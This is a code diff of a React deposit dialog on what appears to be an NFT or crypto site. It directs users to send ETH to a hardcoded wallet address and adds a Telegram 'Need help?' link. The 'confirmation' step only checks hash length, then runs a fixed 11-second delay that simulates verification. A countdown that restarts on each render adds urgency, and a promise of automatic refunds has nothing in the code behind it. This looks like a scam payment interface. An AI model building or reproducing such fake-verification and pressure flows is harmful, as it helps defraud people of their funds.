@@ -31,8 +31,6 @@ const DepositConfirmationDialog = ({
   const [isSubmitting, setIsSubmitting] = useState(false);
   const { toast } = useToast();
   const walletAddress = "0xc68c825191546453e36aaa005ebf10b5219ce175";
-  
-  const endTime = new Date(new Date().getTime() + 30 * 60000).toISOString();
 
   const validateHash = (hash: string) => {
     if (hash.length < 10) {
@@ -52,7 +50,7 @@ const DepositConfirmationDialog = ({
     }
 
     setIsSubmitting(true);
-    await new Promise(resolve => setTimeout(resolve, 11000)); // 11 seconds
+    await new Promise(resolve => setTimeout(resolve, 11000)); // 11 seconds delay
     setIsSubmitting(false);
     
     toast({
@@ -84,7 +82,7 @@ const DepositConfirmationDialog = ({
   };
 
   const handleTelegramHelp = () => {
-    window.open('https://t.me/your_support_channel', '_blank');
+    window.open('https://t.me/purenftsupport', '_blank');
   };
 
   return (
@@ -120,7 +118,7 @@ const DepositConfirmationDialog = ({
                 <p>We have created a request for you.</p>
                 
                 <div className="mt-4">
-                  <CountdownTimer endTime={endTime} />
+                  <CountdownTimer endTime={new Date(new Date().getTime() + 30 * 60000).toISOString()} />
                   <div className="mt-2 text-sm text-muted-foreground">
                     <div className="flex items-start gap-2">
                       <p>If you have already transferred Ethereum, but the timer has expired, the funds will be credited back to your original wallet.</p>
@@ -142,7 +140,9 @@ const DepositConfirmationDialog = ({
                   <p>To send {depositAmount} ETH to the following address:</p>
                   <div className="bg-muted p-2 rounded-md break-all font-mono">
                     {walletAddress}
-                    <div className="mt-1 text-sm text-muted-foreground">(ERC-20)</div>
+                    <div className="mt-1 text-sm text-muted-foreground">
+                      (ERC-20)
+                    </div>
                   </div>
                 </div>
 
@@ -198,6 +198,16 @@ const DepositConfirmationDialog = ({
                     ) : (
                       'Confirm'
                     )}
+                  </Button>
+                </div>
+
+                <div className="text-center mt-4">
+                  <Button
+                    variant="link"
+                    className="text-primary"
+                    onClick={handleTelegramHelp}
+                  >
+                    Need help? <ExternalLink className="ml-1 h-3 w-3" />
                   </Button>
                 </div>
               </>
